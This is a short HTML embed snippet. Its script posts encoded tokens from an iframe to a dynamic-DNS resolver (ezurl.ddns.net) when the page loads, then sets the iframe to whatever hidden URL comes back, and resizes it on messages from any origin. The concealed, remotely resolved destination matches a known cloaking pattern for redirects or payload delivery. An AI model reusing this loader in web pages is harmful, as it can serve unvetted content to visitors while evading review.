<style>
html,body{margin:0;padding:0}
iframe[data-syno]{width:100%;border:0;display:block}
</style>
<iframe data-syno
        data-src="8WTfW0lE"
        data-origin="aFSJl6cy"
        scrolling="no"></iframe>
<script>
(async () => {
  const ifr = document.querySelector('iframe[data-syno]');
  if (!ifr) return;

  const cipherURL = (ifr.dataset.src || '').trim();
  const cipherOrigin = (ifr.dataset.origin || '').trim();

  if (!cipherURL || !cipherOrigin) return;

  const resp = await fetch('https://ezurl.ddns.net/api/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      cipher_url: cipherURL,
      cipher_origin: cipherOrigin
    })
  });
  if (!resp.ok) return;

  const data = await resp.json();
  if (!data || data.error) return;

  const realURL = data.url;
  const allowOrigin = data.origin || '*';
  if (!realURL) return;

  ifr.src = realURL;

  window.addEventListener('message', e => {
    if (allowOrigin !== '*' && e.origin !== allowOrigin) return;
    ifr.style.height = e.data + 'px';
  });
})();
</script>
